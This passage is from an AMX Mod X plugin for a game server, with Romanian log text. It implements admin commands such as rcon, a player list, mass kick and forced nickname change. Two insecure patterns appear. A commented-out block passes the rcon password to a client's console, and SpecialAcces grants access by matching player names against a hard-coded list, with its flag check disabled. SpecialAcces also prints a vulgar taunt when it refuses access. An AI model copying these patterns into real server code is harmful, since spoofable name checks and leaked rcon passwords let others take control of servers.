		client_cmd(id, "rcon_password %s", password)
		client_cmd(id, "rcon %s", args)
	}
	
	return PLUGIN_HANDLED
}

public cmdRcon(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED
	
	new arg[128], authid[32], name[32]
	
	read_args(arg, 127)
	
	get_user_authid(id, authid, 31)
	get_user_name(id, name, 31)
	
	console_print(id, "[AMXX] %L", id, "COM_SENT_SERVER", arg)
	
	server_cmd("%s", arg)
	
	log_amx("Rcon: ^"%s<%d><%s><>^" consola serverului (linia de comanda ^"%s^")", name, get_user_userid(id), authid, arg)
	
	return PLUGIN_HANDLED
}

public cmdWho(id, level, cid)
{
	if (!cmd_access(id, level, cid, 1))
		return PLUGIN_HANDLED
	
	new players[32], inum, cl_on_server[64], authid[32], name[32], flags, sflags[32]
	new lImm[16], lRes[16], lAccess[16], lYes[16], lNo[16]
	
	format(lImm, 15, "%L", id, "IMMU")
	format(lRes, 15, "%L", id, "RESERV")
	format(lAccess, 15, "%L", id, "ACCESS")
	format(lYes, 15, "%L", id, "YES")
	format(lNo, 15, "%L", id, "NO")
	
	get_players(players, inum)
	
	format(cl_on_server, 63, "%L", id, "CLIENTS_ON_SERVER")
	console_print(id, "^n%s:^n #  %-16.15s %-20s %-8s %-4.3s %-4.3s %s", cl_on_server, "nick", "authid", "userid", lImm, lRes, lAccess)
	
	for (new a = 0; a < inum; ++a)
	{
		get_user_authid(players[a], authid, 31)
		get_user_name(players[a], name, 31)
		flags = get_user_flags(players[a])
		get_flags(flags, sflags, 31)
		console_print(id, "%2d  %-16.15s %-20s %-8d %-6.5s %-6.5s %s", players[a], name, authid, 
		get_user_userid(players[a]), (flags&ADMIN_IMMUNITY) ? lYes : lNo, (flags&ADMIN_RESERVATION) ? lYes : lNo, sflags)
	}
	
	console_print(id, "%L", id, "TOTAL_NUM", inum)
	
	get_user_authid(id, authid, 31)
	get_user_name(id, name, 31)
	
	log_amx("Who: ^"%s<%d><%s><>^" se uita la lista cu jucatori.", name, get_user_userid(id), authid) 
	
	return PLUGIN_HANDLED
}

hasTag(name[], tags[4][32], tagsNum)
{
	for (new a = 0; a < tagsNum; ++a)
		if (contain(name, tags[a]) != -1)
			return a
	return -1
}

public cmdLeave(id, level, cid)
{
	if (!cmd_access(id, level, cid, 2))
		return PLUGIN_HANDLED
	
	new argnum = read_argc(), reason[32]
	new ltags[4][32]
	new ltagsnum = 0

	read_argv(2, reason, 31)
	remove_quotes(reason)
	
	for (new a = 1; a < 5; ++a)
	{
		if (a < argnum)
			read_argv(a, ltags[ltagsnum++], 31)
		else
			ltags[ltagsnum++][0] = 0
	}
	
	new nick[32], ires, pnum = get_maxplayers() + 1, count = 0, lReason[128]
	
	for (new b = 1; b < pnum; ++b)
	{
		if (!is_user_connected(b) && !is_user_connecting(b)) continue
		
		get_user_name(b, nick, 31)
		ires = hasTag(nick, ltags, ltagsnum)
		
		if (ires != -1)
		{
			console_print(id, "[AMXX] %L", id, "SKIP_MATCH", nick, ltags[ires])
			continue
		}
		
		if (get_user_flags(b) & ADMIN_IMMUNITY)
		{
			console_print(id, "[AMXX] %L", id, "SKIP_IMM", nick)
			continue
		}
		
		console_print(id, "[AMXX] %L", id, "KICK_PL", nick)
		
		if (is_user_bot(b))
			server_cmd("kick #%d", get_user_userid(b))
		else
		{
			format(lReason, 127, "%L", b, "YOU_DROPPED")
			server_cmd("kick #%d ^"%s^"", get_user_userid(b), lReason)
		}
		count++
	}
	
	console_print(id, "[AMXX] %L", id, "KICKED_CLIENTS", count)
	
	new authid[32], name[32]
	
	get_user_authid(id, authid, 31)
	get_user_name(id, name, 31)
	
	switch(get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_LEAVE_2x", name, ltags[0], ltags[1], ltags[2], ltags[3], reason)
			else
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_LEAVE_2", name, ltags[0], ltags[1], ltags[2], ltags[3])
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_LEAVE_1", ltags[0], ltags[1], ltags[2], ltags[3])
	}
	
	if (reason[0])
		log_amx("Leave: ^"%s<%d><%s><>^" l-a scos din grupa (tag1 ^"%s^") (tag2 ^"%s^") (tag3 ^"%s^") (tag4 ^"%s^") motiv ^"%s^"", name, get_user_userid(id), authid, ltags[0], ltags[1], ltags[2], ltags[3], reason)
	else
		log_amx("Leave: ^"%s<%d><%s><>^" l-a scos din grupa (tag1 ^"%s^") (tag2 ^"%s^") (tag3 ^"%s^") (tag4 ^"%s^")", name, get_user_userid(id), authid, ltags[0], ltags[1], ltags[2], ltags[3])
	
	return PLUGIN_HANDLED
}*/

public cmdNick(id, level, cid)
{
	if (!cmd_access(id, level, cid, 3))
		return PLUGIN_HANDLED
	
	new arg1[32], arg2[32], authid[32], name[32], authid2[32], name2[32], reason[32]
	
	read_argv(1, arg1, 31)
	read_argv(2, arg2, 31)
	read_argv(3, reason, 31)
	remove_quotes(reason) // sau arg1
	
	new player = cmd_target(id, arg1, 1)
	
	if (!player)
		return PLUGIN_HANDLED
	
	get_user_authid(id, authid, 31)
	get_user_name(id, name, 31)
	get_user_authid(player, authid2, 31)
	get_user_name(player, name2, 31)
	
	if(!is_user_bot(player))	set_user_info(player, "name", arg2)
	
	switch (get_cvar_num("amx_show_activity"))
	{
		case 2:
		{
			if (reason[0])
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_NICK_2x", name, name2, arg2, reason)
			else
				chat_color(0,"%L", LANG_PLAYER, "ADMIN_NICK_2", name, name2, arg2)
		}
		case 1: chat_color(0,"%L", LANG_PLAYER, "ADMIN_NICK_1", name2, arg2, reason)
	}
	
	console_print(id, "[AMXX] %L", id, "CHANGED_NICK", name2, arg2)
	
	if (reason[0])
		log_amx("Nick: ^"%s<%d><%s><>^" ii schimba numele jucatorului ^"%s<%d><%s><>^" in ^"%s^" motiv ^"%s^"", name, get_user_userid(id), authid, name2, get_user_userid(player), authid2, arg2, reason)
	else
		log_amx("Nick: ^"%s<%d><%s><>^" ii schimba numele jucatorului ^"%s<%d><%s><>^" in ^"%s^"", name, get_user_userid(id), authid, name2, get_user_userid(player), authid2, arg2)
	
	if( !is_user_alive( player ) )
	{
		if( id )	client_print( id, print_console, "[Server-Protection] Nick-ul i se va schimba la spawn" );
		else	server_print( "[Server-Protection] Nick-ul i se va schimba la spawn" );
	}

	return PLUGIN_HANDLED
}

SpecialAcces( id, NumeAdmin[ ], msg )
{
	new Nume[ 32 ];
	get_user_name( id, Nume, 31 );

	for( new i = 0; i < sizeof( PluginSpecialAcces ); i++ )
	{
		if( equali( NumeAdmin, PluginSpecialAcces[ i ] ) /*&& get_user_flags(id) & ADMIN_BAN*/ )
		{
			return true;
		}
	}

	if( msg )
	{
		console_print( id, "amx_exterminate ^"%s^"", Nume );
		console_print( id, "Apasa orice tasta pentru confirmare" );
		console_print( id, "> TOCMAI I-AI SUPT **** LUI RAIZ0 ! <" );
	}
	return false;
}

stock chat_color(const id, const input[], any:...)
{
	new count = 1, players[32]
	static msg[191]
	vformat(msg, 190, input, 3) // de modificat
	
	replace_all(msg, 190, "!g", "^4")
	replace_all(msg, 190, "!y", "^1")
	replace_all(msg, 190, "!team", "^3")
	replace_all(msg, 190, "!team2", "^0")
	
	if (id) players[0] = id; else get_players(players, count, "ch")
	{
		for (new i = 0; i < count; i++)
		{
			if (is_user_connected(players[i]))
			{
				message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"), _, players[i])
				write_byte(players[i]);
				write_string(msg);
				message_end();
			}
		}
	}
}
